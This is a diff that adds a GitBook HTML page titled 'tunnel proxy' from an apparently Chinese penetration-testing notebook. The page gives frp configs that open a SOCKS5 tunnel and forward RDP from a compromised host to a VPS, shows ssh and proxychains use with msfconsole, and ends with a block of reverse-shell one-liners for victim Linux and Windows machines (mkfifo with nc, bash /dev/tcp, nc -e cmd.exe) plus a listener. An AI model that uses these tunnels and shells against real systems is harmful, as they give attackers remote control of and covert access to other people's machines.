@@ -1,0 +1,643 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>隧道代理 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="外网MSF.html" />
+    
+    
+    <link rel="prev" href="搜索技巧.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../密码/密码.html">
+            
+                <a href="../密码/密码.html">
+            
+                    
+                    密码
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../密码/分组加密对比.html">
+            
+                <a href="../密码/分组加密对比.html">
+            
+                    
+                    分组加密对比
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../密码/分组加密CBC.html">
+            
+                <a href="../密码/分组加密CBC.html">
+            
+                    
+                    分组加密CBC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../密码/分组加密CFB.html">
+            
+                <a href="../密码/分组加密CFB.html">
+            
+                    
+                    分组加密CFB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../密码/分组加密CTR.html">
+            
+                <a href="../密码/分组加密CTR.html">
+            
+                    
+                    分组加密CTR
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../密码/分组加密ECB.html">
+            
+                <a href="../密码/分组加密ECB.html">
+            
+                    
+                    分组加密ECB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../密码/分组加密OFB.html">
+            
+                <a href="../密码/分组加密OFB.html">
+            
+                    
+                    分组加密OFB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../密码/密码定理.html">
+            
+                <a href="../密码/密码定理.html">
+            
+                    
+                    密码定理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../密码/模运算.html">
+            
+                <a href="../密码/模运算.html">
+            
+                    
+                    模运算
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../密码/RSA算法.html">
+            
+                <a href="../密码/RSA算法.html">
+            
+                    
+                    RSA算法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../密码/SM2密钥交换协议.html">
+            
+                <a href="../密码/SM2密钥交换协议.html">
+            
+                    
+                    SM2密钥交换协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../密码/SM2算法.html">
+            
+                <a href="../密码/SM2算法.html">
+            
+                    
+                    SM2算法
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../逆向/逆向.html">
+            
+                <a href="../逆向/逆向.html">
+            
+                    
+                    逆向
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../逆向/反调试汇总.html">
+            
+                <a href="../逆向/反调试汇总.html">
+            
+                    
+                    反调试汇总
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../逆向/Android抓包.html">
+            
+                <a href="../逆向/Android抓包.html">
+            
+                    
+                    Android抓包
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../逆向/ANGR模版.html">
+            
+                <a href="../逆向/ANGR模版.html">
+            
+                    
+                    ANGR模版
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../逆向/ELF参考.html">
+            
+                <a href="../逆向/ELF参考.html">
+            
+                    
+                    ELF参考
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../逆向/FRIDA模版.html">
+            
+                <a href="../逆向/FRIDA模版.html">
+            
+                    
+                    FRIDA模版
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../逆向/IDA参考.html">
+            
+                <a href="../逆向/IDA参考.html">
+            
+                    
+                    IDA参考
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="痕迹清理.html">
+            
+                <a href="痕迹清理.html">
+            
+                    
+                    痕迹清理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="内网横向.html">
+            
+                <a href="内网横向.html">
+            
+                    
+                    内网横向
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="搜索技巧.html">
+            
+                <a href="搜索技巧.html">
+            
+                    
+                    搜索技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.4" data-path="隧道代理.html">
+            
+                <a href="隧道代理.html">
+            
+                    
+                    隧道代理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="外网MSF.html">
+            
+                <a href="外网MSF.html">
+            
+                    
+                    外网MSF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >隧道代理</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x4EE3;&#x7406;&#x8BBE;&#x7F6E;">&#x4EE3;&#x7406;&#x8BBE;&#x7F6E;</h1>
+<h2 id="&#x4EE3;&#x7406;&#x670D;&#x52A1;frp">&#x4EE3;&#x7406;&#x670D;&#x52A1;frp</h2>
+<h3 id="frpc">frpc</h3>
+<pre><code class="lang-bash">[common]
+<span class="hljs-comment">#remote vps addr</span>
+server_addr = vpsip 
+server_port =  64447   
+tls_<span class="hljs-built_in">enable</span> = <span class="hljs-literal">true</span> 
+pool_count = 5
+
+[plugin_socks]
+<span class="hljs-built_in">type</span> = tcp 
+remote_port = 54321 
+plugin = socks5
+use_encryption = <span class="hljs-literal">true</span>
+
+[i]
+<span class="hljs-built_in">type</span> = tcp
+<span class="hljs-built_in">local</span>_ip = 127.0.0.1       
+<span class="hljs-built_in">local</span>_port = 3389
+remote_port = 12346
+</code></pre>
+<h3 id="frps">frps</h3>
+<pre><code class="lang-bash">[common]
+<span class="hljs-built_in">bind</span>_addr = 0.0.0.0
+<span class="hljs-built_in">bind</span>_port = 64447 
+
+dashboard_port = 7500
+dashboard_user = admin1
+</code></pre>
+<h2 id="&#x4EE3;&#x7406;&#x670D;&#x52A1;regeorg">&#x4EE3;&#x7406;&#x670D;&#x52A1;<strong>reGeorg</strong></h2>
+<pre><code class="lang-bash">&#x53C2;&#x89C1;Readme
+</code></pre>
+<h2 id="ssh&#x4EE3;&#x7406;&#x8BBF;&#x95EE;">ssh&#x4EE3;&#x7406;&#x8BBF;&#x95EE;</h2>
+<pre><code>ssh -o &quot;ProxyCommand nc -X 5 -x x.x.x.x:8888 %h %p&quot; root@192.168.80.8
+
+5 - socks5
+</code></pre><h2 id="&#x4EE3;&#x7406;&#x5BA2;&#x6237;&#x7AEF;">&#x4EE3;&#x7406;&#x5BA2;&#x6237;&#x7AEF;</h2>
+<h3 id="proxychain4">proxychain4</h3>
+<pre><code class="lang-bash"><span class="hljs-comment">#&#x914D;&#x7F6E;proxychain&#x7684;&#x4EE3;&#x7406;&#x8FDE;&#x4E0A;frp&#xFF0C;&#x7AEF;&#x53E3;&#x4E3A;54321</span>
+proxychain4 msfconsole
+</code></pre>
+<h3 id="&#x6D4F;&#x89C8;&#x5668;">&#x6D4F;&#x89C8;&#x5668;</h3>
+<pre><code class="lang-bash"><span class="hljs-comment"># &#x914D;&#x7F6E;&#x53C2;&#x6570;&#x53C2;&#x8003;</span>
+sock5
+ip vps
+port 54321
+<span class="hljs-comment"># &#x6CE8;&#x610F; &#x8C37;&#x6B4C;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x652F;&#x6301;&#x5E26;&#x5BC6;&#x7801;&#x7684;sock5</span>
+</code></pre>
+<h2 id="&#x5176;&#x5B83;">&#x5176;&#x5B83;</h2>
+<pre><code class="lang-bash"><span class="hljs-comment">#&#x7B80;&#x6613;&#x7248;&#x53CD;&#x8FDE;</span>
+
+<span class="hljs-comment"># Linux vul&#x673A;&#x5668;</span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 |nc IP 4444 &gt;/tmp/f 
+&#x6216;
+bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1
+
+<span class="hljs-comment"># Window vul&#x673A;&#x5668;</span>
+nc ip 4444 <span class="hljs-_">-e</span> c:\windows\system32\cmd.exe
+
+<span class="hljs-comment">#&#x53CD;&#x5F39;&#x673A;&#x5668;</span>
+nc -lvp 4444
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="搜索技巧.html" class="navigation navigation-prev " aria-label="Previous page: 搜索技巧">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="外网MSF.html" class="navigation navigation-next " aria-label="Next page: 外网MSF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"隧道代理","level":"1.4.4","depth":2,"next":{"title":"外网MSF","level":"1.4.5","depth":2,"path":"渗透/外网MSF.md","ref":"渗透/外网MSF.md","articles":[]},"previous":{"title":"搜索技巧","level":"1.4.3","depth":2,"path":"渗透/搜索技巧.md","ref":"渗透/搜索技巧.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr","-search","search-pro","copy-code-button","expandable-chapters","3-ba","-sharing","github"],"pluginsConfig":{"github":{"url":"https://github.com/b1gcat"},"3-ba":{"configuration":"auto","token":"07bf89aa534c314342001099803e2d76"},"search-pro":{},"copy-code-button":{},"expandable-chapters":{},"highlight":{},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"渗透/隧道代理.md","mtime":"2022-07-17T01:53:57.503Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-17T04:07:39.648Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-3-ba/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
